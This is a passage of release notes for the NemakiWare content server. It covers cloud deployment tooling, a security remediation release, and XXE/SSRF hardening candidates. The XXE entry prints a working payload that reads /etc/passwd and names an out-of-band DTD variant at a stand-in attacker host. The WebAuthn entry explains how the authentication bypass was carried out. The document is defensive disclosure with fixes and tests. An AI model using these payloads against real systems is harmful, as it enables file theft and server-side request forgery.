(archive-restore-consistency, config-viewer's before-render row-count race)
— none in the changed code paths; the one integration-settings assertion
affected by the new overridable-notice behaviour was updated and re-runs
17/17 green.

---

## 3.2.0 — IaaS one-step deployment (published images + cloud bootstrap) (2026-06-20)
_On `release/3.2-iaas-setup`. Removes the "build the WAR on the target
host" friction: operators now deploy by **pulling pre-built images** on a
bare VM. No Java/Maven/Node toolchain required on the host._

### New: published container images
- **`.github/workflows/release-images.yml`** — pushing a `v*` git tag (or a
  manual `workflow_dispatch`) builds the WAR (same proven steps as the
  integration-test workflow) and publishes two images to GHCR:
  - `ghcr.io/<owner>/nemakiware-core:<version>` (+ `:latest` on tag builds)
  - `ghcr.io/<owner>/nemakiware-solr:<version>`
  - CouchDB and TEI remain upstream images (not republished).
- linux/amd64, GHA build cache, OCI source/revision labels.

### New: production compose (pull, don't build)
- **`docker/docker-compose-prod.yml`** — references the published images via
  `${NEMAKI_IMAGE_PREFIX}` / `${NEMAKI_VERSION}` instead of `build:`.
  Hardened posture: CouchDB and Solr have **no published host ports**
  (internal compose network only); core binds `8080` to
  `${NEMAKI_HTTP_BIND:-127.0.0.1}` so operators front it with TLS.
  `restart: unless-stopped`, optional `--profile rag` for TEI.
- **`docker/.env.prod.example`** — full environment template (image coords,
  CouchDB credentials, heap, public scheme, optional auth/LDAP/RAG knobs).

### New: cloud bootstrap scripts
- **`deploy/aws/user-data.sh`** (Amazon Linux 2023) and
  **`deploy/azure/custom-data.sh`** (Ubuntu 22.04/24.04) — paste into EC2
  user-data / Azure custom-data. They install Docker, clone the deploy tree
  at the chosen tag, resolve the CouchDB password (random by default, or
  AWS Secrets Manager / Azure Key Vault via managed identity), write `.env`,
  `docker compose pull && up -d`, and install a systemd unit so the stack
  survives reboot. AWS variant also reads overrides from instance tags.
- **`deploy/README.md`** — AWS + Azure quickstart, console + CLI, post-launch
  hardening checklist (change admin/admin, TLS front-end, snapshot volumes),
  private-image login, and local/on-prem reuse.

### New: Terraform modules (`terraform apply` one-shot)
- **`deploy/terraform/aws/`** and **`deploy/terraform/azure/`** — provision the
  VM + network + IAM and hand the (same) bootstrap script as user-data /
  custom-data. Deploy coordinates are injected deterministically as env exports
  prepended to the script (no tag-propagation race).
  - AWS: latest Amazon Linux 2023 resolved from the public SSM parameter
    (no hardcoded AMI), default-VPC fallback, IMDSv2-only, gp3 encrypted root,
    SG that opens 443 (and 8080 only in the demo posture), optional EIP, and an
    IAM policy scoped to a single Secrets Manager secret when configured.
  - Azure: Ubuntu 22.04 (gen2), VNet/subnet/NSG/public-IP, SSH-key auth,
    optional system-assigned identity for Key Vault (principal id is output so
    you can grant `get`).
  - Both validated with `tofu validate` against the real aws/azurerm providers;
    `terraform fmt` clean. `deploy/terraform/README.md` documents usage.

### New: deploy-asset validation CI
- **`.github/workflows/deploy-validate.yml`** — on any change under `deploy/**`
  or the prod compose, runs `bash -n` + shellcheck on the bootstrap scripts,
  `docker compose config` (base + rag) with a **JSON security-posture guard**
  (asserts CouchDB/Solr publish no host ports and core binds 127.0.0.1 by
  default), and `terraform fmt -check` + `validate` on both modules. Keeps the
  deployment automation from regressing unnoticed.

### Security hardening (Codex review remediation)
- Bootstrap scripts assign VM/instance-tag overrides with `printf -v`
  (literal, no re-evaluation) instead of `eval` — tag values are
  attacker-influenceable.
- Script default `NEMAKI_HTTP_BIND` is `127.0.0.1` (safe by default, matches
  the compose default); public plain-HTTP exposure is an explicit opt-in.
- Terraform injects deploy coordinates as single-quoted env exports; the AWS
  IAM grant is scoped to a validated Secrets Manager **ARN**
  (`couchdb_secret_arn`).
- Secrets Manager / Key Vault fetch failures fail loudly with guidance instead
  of aborting silently under `set -euo pipefail`; AWS bootstrap installs the
  Compose v2 CLI plugin when absent (AL2023 does not bundle it).

### Notes
- `nemakiware-core` is built from `Dockerfile.simple`; runtime configuration
  is supplied via `-D` system properties from the compose env (existing
  convention), with an optional volume mount to fully override
  `nemakiware.properties`.
- Backing services (CouchDB, Solr) stay self-hosted — there is no managed
  equivalent on AWS/Azure — but the guide steers persistence to EBS/Managed
  Disk snapshots.

---

## 3.1.3 — Full-review remediation (security + correctness) (2026-06-11)
_On `release/3.1.3`. Two passes: Fable multi-agent review + Codex
independent verification, then prioritized fixes with regression tests
and live verification (TCK + redeploy)._

### Security
- **[CRITICAL] WebAuthn authentication bypass** — the discoverable
  (usernameless) assertion flow trusted the client-supplied `userHandle`:
  `NemakiCredentialRepository.lookup()` echoed it back instead of binding
  to the credential's stored owner, making the library's userHandle
  equality check a tautology. An attacker with their own passkey could set
  `response.userHandle = bytes("admin")` and authenticate as any user
  (admin included). Fixed by binding to `cred.getUserId()` and rejecting a
  mismatched handle (parity with `lookupAll()`). +`WebAuthnResourceLookupTest`.
- **Password-policy bypass** — the Spring MVC user path (`UserController`
  create/update), the api/v1 `UserResource` update, and the legacy
  `UserItemResource` update/updateJson hashed passwords without calling
  `PasswordPolicyService.validate()`. All paths now enforce the policy.
  +`UserControllerPasswordPolicyTest`.
- **IMAP IDLE delegation bypass** — `ImapIdleMonitor` ran imports with a
  `null` CallContext, skipping the delegated-profile re-authorization that
  the scheduler/webhook paths apply. IDLE now re-evaluates
  `authorizeDelegatedFetch` at start and per message and runs under the
  synthesized context (admin profiles unchanged).
- **Content-Disposition filename injection** — download filenames were
  concatenated unsanitized, allowing quote-breakout / extension spoofing.
  Centralized in `ImportExportUtils.contentDispositionAttachment`
  (sanitized `filename=` + RFC 5987 `filename*`) across the CMIS Browser,
  api/v1 Object/Rendition, ImportExport and ArchiveDownload paths.
  +`ContentDispositionTest`.

### Correctness / data integrity
- **checkIn data loss** — the new version was created only after the PWC
  (and the former version's latest flags) had been mutated, so a failed
  `create()` could lose the user's checked-out edits and leave the version
  series with no latest version. Reordered so the new version is persisted
  FIRST; the former-version flag flip and PWC deletion are now post-create
  cleanup. Verified by TCK VersioningTestGroup.
- **changeLog token uniqueness + termination** — change-event tokens were
  the raw millisecond clock (collisions under Virtual Threads → duplicate /
  lost `getContentChanges` events). Now strictly increasing within the JVM
  (AtomicLong floor, still a parseable numeric token). Separately,
  `getLatestChangeToken` returned the CouchDB `_id` instead of the token,
  so `hasMoreItems` never reached equality (endless drain) and the
  published `latestChangeLogToken` cursor was unusable — fixed to return
  the token.
- **getApiKeys memory** — replaced `_all_docs + include_docs` (full-DB
  load into the JVM) with a Mango `_find` selector, and added a `(type)`
  index on each content DB (`Patch_ApiKeyMangoIndex`) so the lookup is
  index-backed rather than a full scan.

### UI
- Group create/update/delete now surface server `{status:"failure"}`
  (HTTP 200) bodies as errors instead of reporting success; `restoreObject`
  no longer swallows a restore failure as success; `DocumentList` guards
  against a stale folder response overwriting the current folder's list /
  path / allowable-actions during rapid navigation.

### Quality / maintainability
- Null guards on the NPE-prone `getOrCreateSystemSubFolder` copies; explicit
  `threadLockService` wiring for `userItemResource` (removing a load-bearing
  SpringContext fallback); +`executeChatContextImport` dedupe-skip
  regression test.

### Ingest robustness (P2 follow-up)
- **Fetch-timeout misreport (#13)** — a scheduled fetch that hits the poll
  timeout is now recorded as `STUCK` (not a misleading `FAILED` with
  imported=0); items already imported reconcile on the next poll via dedupe.
- **Checkpoint cross-item gap (#3)** — an item whose download fails BEFORE
  reaching `execute()` (Box/Dropbox files; Notion/Teams/Mattermost
  attachments) is now dead-lettered, so the high-water checkpoint advancing
  past it (when a newer item in the batch succeeds) no longer silently loses
  it. New `FetchSupport.saveToDlq` helper. Note: the orchestrator-level DLQ
  path is not yet unit-covered (adapters are not injectable) — WireMock
  orchestrator integration tests are a recommended follow-up.

### Deferred → done
- ~~REST 3-stack consolidation (#14)~~ → **done** (see "REST 3-stack
  consolidation (#14)" below). Merged into `release/3.1.3` by fast-forward
  (HEAD `c92c2adb6`).

### REST 3-stack consolidation (#14) — ContentService unification (2026-06-13, merged to release/3.1.3)

The User / Group / Rendition / Archive domain logic that was duplicated across
the three REST bindings — legacy Jersey (`rest/*`), Spring MVC
(`rest/controller/*`) and api/v1 JAX-RS (`api/v1/resource/*`) — is consolidated
into `ContentService` (impl `ContentServiceImpl`) as the single source of truth.
Each binding keeps its own contract (validation / authorization / response
shaping) and delegates only the shared build / persist / guard tail, so every
response shape and status code is unchanged.

Nine commits (`7f24b1a9b` … `c92c2adb6`), increments 1–6 plus a Codex-review pass:

| Inc | Area | New API |
|---|---|---|
| 1 | system sub-folder | `getOrCreateSystemSubFolder` (with `.system` bootstrap fallback) |
| 2 | group member add/remove | `GroupMembershipEditor` (pure util, Outcome enum) |
| 3 | group create | `validateNewGroup` / `buildAndCreateGroup` / `GroupValidation` |
| 3b | group update/delete | `applyGroupUpdate` / `deleteGroup` (+nested-ref cleanup) |
| 4 | user create | `buildAndCreateUser` (centralised BCrypt) |
| 4b | user update/delete/changePassword | `hashPassword` / `applyUserUpdate` / `deleteUser` (+group-membership cleanup) |
| 5 | rendition generate tail | `createPreviewRendition` |
| 6 | archive restore guard | `isArchiveAccessible` / `restoreArchiveGuarded` / `ArchiveRestoreOutcome` |

**Five latent bugs/gaps fixed during consolidation**: group-delete dangling
nested references and user-delete dangling group memberships (legacy/Spring
skipped the cleanup); a "no revision" exception when the nested/membership
cleanup updated the revision-less `getGroupItems` results (fixed by re-fetching
via `getGroupItemById`); the missing cold-storage guard on api/v1 archive
restore (now applied to all stacks via `restoreArchiveGuarded`); and the loss of
the legacy user-create `.system` bootstrap when the consolidated
`getOrCreateSystemSubFolder` threw instead of creating `.system` (root-level
auto-create restored).

**Codex independent review**: no Blocker/High. One Medium (system-folder
bootstrap) + two Low (changePassword admin branch missed the hash helper /
~177 lines of dead code) reflected.

**Verification**: 36 consolidation unit tests PASS; TCK full suite **38/38** (the
initial Basics-rootFolder / Types-baseTypes failures were stray-doc + E2E-custom-
type data pollution from a prior session — green after cleanup, i.e. not a
regression); Playwright chromium full **932 passed / 0 failed / 2 flaky
(retry-passed) / 99 skipped**; live 3-stack manual API checks.

---

## 3.1.1-RC6.13 — Test quality: feature-readback now binds to production reader (closes RC6.12 P3)
_Release candidate on `release/3.1.1-RC6` (2026-05-31), branched
off `v3.1.1-RC6.12` (`f8ec0326c`)._

Test-quality follow-up to RC6.12. The actual security guard is
unchanged (the three SAX features are still set on the production
`SAXReader` by the same single helper method); this RC restructures
so the feature-readback assertion binds to the production-configured
reader instance instead of a test-local probe.

### Reviewer P3 — readback was inspecting a test-local probe

RC6.12's `productionParserHasAllThreeFeaturesEnabled` test did
two unrelated things in one method:
1. Called `ZipImporter.parseAcpPackageXml(...)` once on a benign
   payload to prove the production code path is reachable.
2. Then built **its own** `SAXReader`, manually re-applied the
   three `setFeature(...)` calls, and queried `getXMLReader().
   getFeature(...)` on **that** probe.

The reviewer pointed out that if (for example)
`external-general-entities=false` were deleted from production
but `disallow-doctype-decl=true` remained, the DOCTYPE-rejection
tests still pass (the DOCTYPE check catches the PoC payload
earlier) AND the readback test still passes (because it queries
the probe, not production). So removing 2 of the 3 features in
production would not have been caught by any test.

### The fix — `configureHardenedSaxReader()` extracted as single source of truth

Split the RC6.12 production helper into two:
- **`ZipImporter.configureHardenedSaxReader()`** (new, package-private
  static) builds a `SAXReader` and applies the three `setFeature(...)`
  calls. Returns the configured reader. This is the **single source
  of truth** for the SAXReader configuration.
- **`ZipImporter.parseAcpPackageXml(byte[])`** now calls
  `configureHardenedSaxReader()` and then `.read(...)`. Production
  path is byte-equivalent to RC6.12.

`ZipImporterXxeTest.productionParserHasAllThreeFeaturesEnabled`
now holds the actual production-configured reader:

```java
org.dom4j.io.SAXReader productionReader = ZipImporter.configureHardenedSaxReader();
productionReader.read(...);  // force XMLReader instantiation
org.xml.sax.XMLReader xmlReader = productionReader.getXMLReader();
assertTrue (xmlReader.getFeature(".../disallow-doctype-decl"), ...);
assertFalse(xmlReader.getFeature(".../external-general-entities"), ...);
assertFalse(xmlReader.getFeature(".../external-parameter-entities"), ...);
```

If any one of the three `setFeature(...)` calls is removed from
`configureHardenedSaxReader()`, the matching assertion fails with
a diagnostic that names that specific feature.

### 3-way mutation test — proves the new test catches all 3 features

Ran the mutation test once per feature, individually:

| Mutation | Tests failing | Diagnostic from readback |
|---|---|---|
| Remove `disallow-doctype-decl=true` | **3/4** (2 DOCTYPE-reject + readback) | `disallow-doctype-decl must be true on the production-configured reader` |
| Remove `external-general-entities=false` | **1/4** (readback only) | `external-general-entities must be false on the production-configured reader ==> expected: <false> but was: <true>` |
| Remove `external-parameter-entities=false` | **1/4** (readback only) | `external-parameter-entities must be false on the production-configured reader ==> expected: <false> but was: <true>` |

Each mutation was a local source-edit + revert; nothing committed.
After restoring all three lines: 4/4 PASS.

The middle two cases (removing one of the `external-*-entities`
features) are exactly the regression class the RC6.12 reviewer
flagged. RC6.12's test missed them. RC6.13 catches them.

### Tests

- **`ZipImporterXxeTest`**: 4/4 PASS — readback now queries
  `ZipImporter.configureHardenedSaxReader()` directly.
- **3-way mutation test** (see table above): each of the 3
  production `setFeature` lines, when removed in isolation,
  causes the readback test to fail with a diagnostic naming that
  feature. Restored before commit.
- **Focused 25-class regression**: **377/377 PASS** (unchanged
  from RC6.12 — refactor is behaviour-equivalent on the
  production path).
- **SOC validator full run** (no Docker): **17 PASS / 7 SKIP**,
  Phase 1.4.1 source-tree NUL scan = **1681 source files / 0
  hits** (unchanged from RC6.12).

### Files touched (RC6.13)

**Code (1 file)**:
- `core/src/main/java/jp/aegif/nemaki/rest/importexport/ZipImporter.java`
  — split `parseAcpPackageXml(byte[])` into
  `configureHardenedSaxReader()` (returns the configured reader)
  + `parseAcpPackageXml(byte[])` (calls the helper, then `.read`).
  Production path byte-equivalent.

**Tests (1 file)**:
- `core/src/test/java/jp/aegif/nemaki/rest/importexport/ZipImporterXxeTest.java`
  — `productionParserHasAllThreeFeaturesEnabled` rewritten to
  hold the actual production-configured reader via
  `ZipImporter.configureHardenedSaxReader()`. Test-local probe
  block deleted.

**Docs**: `RELEASE_NOTES.md`, `CLAUDE.md`, `REVIEW_PACKET.md`.

### Migration / compatibility

No public API change (`configureHardenedSaxReader` is
package-private — its only production caller is the sibling
`parseAcpPackageXml` in the same class). No property / schema /
patch / view / Mango / migration change. Operators see zero
behavioural difference. RC6.11 GHSA XXE security boundary is
unchanged; RC6.12 production path behaviour is unchanged.

### Credit

RC6.12 external reviewer P3 finding — caught that the readback
assertion was querying a test-local probe rather than the
production-configured reader.

---

## 3.1.1-RC6.12 — Test quality: bind XXE regression to production parser
_Release candidate on `release/3.1.1-RC6` (2026-05-31), branched
off `v3.1.1-RC6.11` (`8e52d95d2`)._

Test-quality follow-up to the RC6.11 GHSA XXE fix. The actual
security guard in `ZipImporter` is unchanged — this RC strengthens
the regression test so a future deletion of the production
`setFeature` calls would fail the test.

### Reviewer P2 — test was not exercising the production path

RC6.11's `ZipImporterXxeTest` configured its own SAXReader inside
a test-local `hardenedReader()` helper. The production
`ZipImporter.importAcpFormat(...)` had its own (duplicated)
SAXReader configuration block. The test asserted that the
test-local reader rejected DOCTYPE — but if someone deleted the
three `setFeature(...)` calls from `importAcpFormat`, the test
would still pass green.

Fix: extract the production parser into a package-private static
helper and have the test call it directly.

- New method `ZipImporter.parseAcpPackageXml(byte[]) throws DocumentException`
  contains the SAXReader construction + 3-`setFeature` block + the
  `reader.read(...)` call. Package-private (not public) — it has a
  single legitimate caller plus the test class.
- `ZipImporter.importAcpFormat(...)` now calls
  `parseAcpPackageXml(xmlData)` instead of inlining the parser
  configuration. Same behaviour on the production path
  (byte-equivalent classifier output; same `DocumentException`
  thrown for the same DOCTYPE inputs).
- `ZipImporterXxeTest` four cases now call
  `ZipImporter.parseAcpPackageXml(...)` directly. The test-local
  `hardenedReader()` helper is deleted.

### Mutation-test confirmation

Verified the new test actually binds to production. Temporarily
commented out the `disallow-doctype-decl` line in
`ZipImporter.parseAcpPackageXml`, ran the test:

```
[ERROR] Tests run: 4, Failures: 2, Errors: 0
[ERROR]   rejectsDoctypeWithFileSystemEntity:58 ... ==> expected: not <null>
[ERROR]   rejectsDoctypeWithExternalParameterEntity:80 ... ==> expected: not <null>
```

Restored the line, re-ran: `Tests run: 4, Failures: 0`. The
regression guard now bites if a future change removes the
production hardening. (Did not commit the mutation; it was a
local source-edit + revert.)

### Reviewer P3 — NUL scan file count corrected in docs

RC6.11 docs stated "1683 source files / 0 hits" for the Phase 1.4.1
source-tree NUL byte scan. Reviewer's local run reported
**1681 source files / 0 hits**, which is correct. The RC6.11 doc
number was wrong (off-by-2 — my arithmetic, not the validator's).

RC6.12 docs use the validator's actual output: **1681 source files
/ 0 hits**. Same number as RC6.11 actual; no new test files were
added in this RC (only `ZipImporter.java` and
`ZipImporterXxeTest.java` were edited).

### Tests

- **`ZipImporterXxeTest`**: 4/4 PASS — now via
  `ZipImporter.parseAcpPackageXml(...)` directly.
- **Mutation test**: removing the production `disallow-doctype-decl`
  feature causes 2/4 tests to fail (the two DOCTYPE-rejection
  cases). Restored before commit.
- **Focused 25-class regression**: **377/377 PASS** (unchanged
  count from RC6.11; same 25 classes, behaviour-equivalent
  refactor on the production side).
- **SOC validator full run** (no Docker): **17 PASS / 7 SKIP**
  including Phase 1.4.1 source-tree NUL scan — **1681 source
  files / 0 hits**.

### Files touched (RC6.12)

**Code (1 file)**:
- `core/src/main/java/jp/aegif/nemaki/rest/importexport/ZipImporter.java`
  — extract `parseAcpPackageXml(byte[])` as package-private static
  helper; `importAcpFormat(...)` now calls it. No behaviour change
  on the production path.

**Tests (1 file)**:
- `core/src/test/java/jp/aegif/nemaki/rest/importexport/ZipImporterXxeTest.java`
  — four cases rewritten to call
  `ZipImporter.parseAcpPackageXml(...)` directly. Test-local
  `hardenedReader()` helper deleted.

**Docs**: `RELEASE_NOTES.md`, `CLAUDE.md`, `REVIEW_PACKET.md`.

### Migration / compatibility

No public API change (`parseAcpPackageXml` is package-private).
No new properties. No schema / patch / view / Mango index changes.
Same `DocumentException` thrown for the same DOCTYPE inputs, same
`Document` returned for the same benign inputs. Operators see
zero behavioural difference.

### Credit

Reviewer P2/P3 findings on RC6.11 external review — credit for
catching the test-not-binding-to-production issue + the NUL-count
drift.

---

## 3.1.1-RC6.11 — Security: XXE on ACP import (CWE-611, GHSA, reporter tonghuaroot)
_Release candidate on `release/3.1.1-RC6` (2026-05-31), branched
off `v3.1.1-RC6.10` (`cf2f499f3`)._

Seventh RC in the SSRF/XXE hardening cycle. **High-severity** XML
External Entity vulnerability on the ACP (Alfresco Content Package)
ZIP import path. Reported by tonghuaroot via GHSA — same reporter
as the RC6.5 SSRF advisory.

### The bug

`jp.aegif.nemaki.rest.importexport.ZipImporter.importAcpFormat(...)`
read the package XML (top-level `*.xml` entry inside an uploaded
ACP ZIP) with a bare `new SAXReader()` (dom4j) that resolved
DOCTYPE / SYSTEM / parameter entities by default. An
authenticated non-admin user holding only `cmis:write` on a
single target folder could upload a crafted ACP whose package
XML contained:

```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<root><folder><name>&xxe;</name></folder></root>
```

The resolved entity content was persisted **verbatim** into the
created CMIS folder's `cmis:name` and was therefore recoverable
through the product's own CMIS API — no out-of-band channel
required.

**Impact**:
- Arbitrary local file read by an authenticated, non-administrative
  user (demonstrated `/etc/passwd`, `/etc/hostname`; the same
  primitive reads any path readable by the Tomcat process —
  application config, credentials, key material, etc.).
- Server-Side Request Forgery via SYSTEM / external parameter
  entities targeting `http://internal-host/...`.

**Privilege required**: standard content author (`cmis:write` on
one folder via `applyACL`). Reproduced live with a non-admin
`bob` user against the deployed `v3.1.1-RC6.10` stack before fix.

### The fix

`ZipImporter.importAcpFormat(...)` now configures the SAXReader
exactly like the sibling `jp.aegif.nemaki.rest.TypeResource.parse(...)`
(which had this guard since RC13):

```java
SAXReader reader = new SAXReader();
try {
    reader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    reader.setFeature("http://xml.org/sax/features/external-general-entities", false);
    reader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
} catch (org.xml.sax.SAXException e) {
    throw new DocumentException("Failed to configure XXE protection on SAXReader", e);
}
xmlDoc = reader.read(new ByteArrayInputStream(xmlData));
```

The DOCTYPE-bearing PoC now returns:
```json
{"documentsCreated":0,"foldersCreated":0,"message":"Import completed",
 "errors":["Failed to parse package XML: ... DOCTYPE is disallowed when
   the feature \"http://apache.org/xml/features/disallow-doctype-decl\"
   set to true."],"status":"partial"}
```

Benign DOCTYPE-free ACP packages still import successfully.

### Repo-wide audit (per reporter recommendation)

Audited every `new SAXReader()` / `DocumentBuilderFactory.newInstance()`
/ `XMLInputFactory` / `SAXParserFactory` in the codebase:

| Sink | Status |
|---|---|
| `ZipImporter.java:191` | **Bug — fixed in this RC.** |
| `TypeResource.java:1721` | Already hardened (since RC13). |
| `AuthTokenResource.java:475` (SAML response parsing) | Already hardened — full 5 features incl. `FEATURE_SECURE_PROCESSING` + `ACCESS_EXTERNAL_DTD/SCHEMA` empty. |
| `SolrResource.java:403`, `SolrAllResource.java:143` | Already hardened (since RC13). |
| `SamlSignatureVerifier.java` | Receives a parsed `Document` from `AuthTokenResource`; does no XML parsing itself. |

No other unhardened XML parser sinks found.

### New regression test

`core/src/test/java/jp/aegif/nemaki/rest/importexport/ZipImporterXxeTest.java`
(4 cases, JVM-level — no Tomcat needed):
1. `rejectsDoctypeWithFileSystemEntity` — feeds the reporter's
   exact `<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/passwd">
   ]>` payload, asserts `DocumentException` with "DOCTYPE is
   disallowed" diagnostic.
2. `rejectsDoctypeWithExternalParameterEntity` — blind/OOB variant
   (`<!DOCTYPE root SYSTEM "http://attacker/evil.dtd">`),
   asserts `DocumentException`.
3. `acceptsBenignDoctypeFreePackageXml` — guards against over-block
   regression; benign ACP shape must still parse cleanly.
4. `hardenedReaderHasAllThreeFeaturesEnabled` — reads back the
   three SAX feature values via `getXMLReader().getFeature(...)`
   to pin the contract even if a future change reorders or drops
   one of the `setFeature` calls.

### Live verification

Done against this session's RC6.10 stack:

1. **Pre-fix reproduction** — created non-admin `bob`, granted
   `cmis:write` on a fresh folder, uploaded `xxe_passwd.zip`,
   server returned `foldersCreated: 1` and the container's
   `/etc/passwd` content showed up verbatim as a CMIS folder
   name in CouchDB.
2. **Post-fix** (after deploying the patched WAR) — identical
   upload returned the documented "DOCTYPE is disallowed"
   error with `foldersCreated: 0`, `status: partial`.
3. **Benign control** — DOCTYPE-free ACP zip imported with
   `foldersCreated: 1`, `status: success`.
4. **Test artifacts cleanup** — leaked-content folder + bob user
   + parent folder + archive db copies all swept after
   verification.

### Tests

- **`ZipImporterXxeTest`** (new): **4/4 PASS**.
- **Focused 25-class regression** (24 from RC6.10 + new
  `ZipImporterXxeTest`): **377/377 PASS** (was 373 in RC6.10;
  +4 from new XXE test).
- **SOC validator full run** (no Docker): **17 PASS / 7 SKIP**
  including Phase 1.4.1 source-tree NUL scan (1681 source files
  / 0 hits — was 1680 in RC6.10; +1 from `ZipImporterXxeTest`.
  RC6.11 release notes originally claimed "1683"; this was a
  doc arithmetic error, corrected in RC6.12.).

### Files touched (RC6.11)

**Code (1 file)**:
- `core/src/main/java/jp/aegif/nemaki/rest/importexport/ZipImporter.java`
  — 3-feature hardening block added to the SAXReader configuration
  in `importAcpFormat(...)`. Mirrors the existing TypeResource
  pattern 1:1.

**Tests (1 file)**:
- `core/src/test/java/jp/aegif/nemaki/rest/importexport/ZipImporterXxeTest.java`
  (NEW, 4 cases).

**Docs**: `RELEASE_NOTES.md`, `CLAUDE.md`, `REVIEW_PACKET.md`.

### Migration / compatibility

No public API change. No new properties. No schema / patch / view
/ Mango index changes. Existing legitimate ACP imports continue to
work — only DOCTYPE-bearing payloads (which have no legitimate use
in NemakiWare's ACP format) now fail with a clear diagnostic.

### Credit

Reported by **tonghuaroot** via GitHub Security Advisory. Same
reporter as the RC6.5 SSRF advisory.

---

## 3.1.1-RC6.10 — Refactor: extract SsrfGuard shared utility + source-tree NUL pre-commit scan
_Release candidate on `release/3.1.1-RC6` (2026-05-31), branched
off `v3.1.1-RC6.9` (`76695f46c`)._

Sixth RC in the SSRF hardening cycle. No new security gap closed
— this RC consolidates the SSRF address-classification logic that
had been duplicated between `HttpWebhookDispatcher` and
`AdapterHttpClient` since RC6.7, and adds a source-side NUL byte
scan so future regressions of the RC6.1 / RC6.7 NUL-shipped class
get caught before tag.

### Rule-of-Three refactor — new `jp.aegif.nemaki.security.SsrfGuard`

RC6.5 added `isAddressSafe` + `extractEmbeddedIpv4` to
`HttpWebhookDispatcher`. RC6.7 horizontalized the same logic into
`AdapterHttpClient`. A 3rd consumer (Purview / Atlas / OIDC /
Graph outbound URL validators — tracked as deferred work in
REVIEW_PACKET §6) would have required updating duplicated copies
in 3 places.

New utility class:
- `core/src/main/java/jp/aegif/nemaki/security/SsrfGuard.java`
  with two public static methods:
  - `isAddressSafe(InetAddress)` — full classification (JDK
    predicates + 9 IPv4 special-use ranges + IPv6 ULA + 6 IPv6
    transition formats with embedded-IPv4 unwrap + recursive
    re-classify).
  - `extractEmbeddedIpv4(InetAddress)` — returns the embedded
    IPv4 for any recognized IPv6 transition format, or `null`.

Both call sites now delegate:
- `HttpWebhookDispatcher.isAddressSafe(InetAddress, String)`
  delegates the classification and only re-runs cheap top-level
  predicates locally to produce categorized operator log lines.
- `AdapterHttpClient.isAddressSafe(InetAddress)` is a thin
  delegator (kept so `pinRequestToValidatedAddress` and
  `validateExternalUrl` call sites stay byte-equivalent).

Code is a byte-for-byte extraction — no behavioural change. The
classification rules are unchanged from RC6.9.

### New `SsrfGuardTest` — 30 cases pinning the helper directly

`core/src/test/java/jp/aegif/nemaki/security/SsrfGuardTest.java`
covers every classification bucket directly on the helper:
- 5 JDK predicate categories (loopback, link-local, RFC 1918,
  any-local, multicast) — 4 tests
- 6 IPv4 special-use ranges (CGNAT, 0/8, 192.0.0/24, 198.18/15,
  240/4, broadcast) with boundary tests for 100.63/100.128 — 5
  tests
- IPv6 ULA — 1 test
- 6 IPv6 transition formats (NAT64 well-known, NAT64 local-use
  /48, 6to4, Teredo, IPv4-mapped, IPv4-compatible) — each tested
  with both private-IPv4 wrap (reject) and public-IPv4 wrap
  (allow where applicable) — 10 tests
- 2 public-allowlist tests (don't over-block public IPv4 / IPv6
  including 2001:db8:: documentation prefix)
- 8 `extractEmbeddedIpv4` direct tests including the strict
  2001::/32 Teredo prefix vs 2001:db8:: documentation distinction

`HttpWebhookDispatcherTest.testExtractEmbeddedIpv4PublicPassthrough`
updated to call `SsrfGuard.extractEmbeddedIpv4` directly (public
static, no reflection needed).

### Source-tree NUL byte pre-commit scan — `Phase 1.4.1`

`scripts/validate-soc-templates.sh` extended with a new
`Phase 1.4.1` that scans `.java`, `.ts`, `.tsx`, `.js`, `.jsx`
files for literal NUL (0x00) bytes. Two NUL-shipped regressions
in this RC cycle alone:
- **RC6.1 P2-3**: `ConnectorGovernanceTab.tsx` had a literal
  0x00 in a `simulateRemove.join('\0')` separator.
- **RC6.7 P3**: `HttpWebhookDispatcherTest.java` had a literal
  0x00 in a string literal.

Both got past Java / TypeScript compilation; both broke `grep` /
`rg` / `file` which treated the files as binary. Operators
running the validator now get a source-tree NUL scan as part of
`Phase 1.4.1` — across the current tree (1680 source files), 0
NUL bytes detected.

Excludes: `node_modules`, `target`, `dist`, `build`, `.git`,
`coverage`, `playwright-report`, `test-results`. Disable for
clean-tree environments via `VALIDATE_SOURCE_NUL=0`.

### Follow-up R3 closed — orchestrator audit complete

REVIEW_PACKET §6 R3 ("verify other orchestrators don't bypass
SSRF guard"): of 11 connector adapters, only 3 orchestrators
ever pass `connector.getEndpoint()` to an HTTP call:
- `MattermostFetchOrchestrator` — already protected (RC6.8
  explicit `validateExternalUrl` at orchestrator entry).
- `SalesforceFetchOrchestrator` — already protected (RC6.8
  explicit `validateExternalUrl` at orchestrator entry).
- `ImapFetchOrchestrator` — uses `imap://` scheme, would fail
  `validateExternalUrl`'s http/https-only check; NOT placed
  behind that guard intentionally.

The other 8 orchestrators (Slack / Teams / Gmail / M365Mail /
Notion / Chatwork / Box / Dropbox) use hardcoded vendor API URLs
and never pass user-controlled endpoint values to HTTP. Plus
`AdapterHttpClient.pinRequestToValidatedAddress` runs send-time
re-validation on every request regardless of caller path, so even
if a future change accidentally added a configurable endpoint
without explicit validation, the SSRF guard still applies at the
HTTP layer.

R3 is now documentation-only — no code change required.

### Tests + verification

- **`SsrfGuardTest`** — 30/30 PASS (new in this RC).
- **`HttpWebhookDispatcherTest`** — 59/59 PASS (unchanged
  behaviour; reflection test updated to call `SsrfGuard`
  directly).
- **`AdapterRegistryTest`** — 26/26 PASS (unchanged).
- **7 adapter contract tests** (Slack 12 / Teams 11 / Mattermost
  12 / Notion 8 / Salesforce 11 / M365 9 / Chatwork 13): 76/76
  PASS — confirms refactor doesn't break legitimate adapter API
  call patterns.
- **Focused 24-class regression** (23 from RC6.9 + new
  `SsrfGuardTest`): **373/373 PASS** (was 343 in RC6.9; +30 from
  new helper test). Combined SSRF surface: 115 PASS (was 85 in
  RC6.9).
- **Maven compile** — clean (no behavioural changes to
  `HttpWebhookDispatcher` or `AdapterHttpClient` from the
  refactor; both delegate to `SsrfGuard`).
- **Source-tree NUL scan** — 0 hits across 1680 source files.
- **SOC validator full run** — 17 PASS / 7 SKIP (Docker phase
  not run; remains opt-in via `VALIDATE_DOCKER=1`).

### Files touched (RC6.10)

**Code (3 files)**:
- `core/src/main/java/jp/aegif/nemaki/security/SsrfGuard.java`
  (NEW, 263 lines — extracted helper).
- `core/src/main/java/jp/aegif/nemaki/webhook/HttpWebhookDispatcher.java`
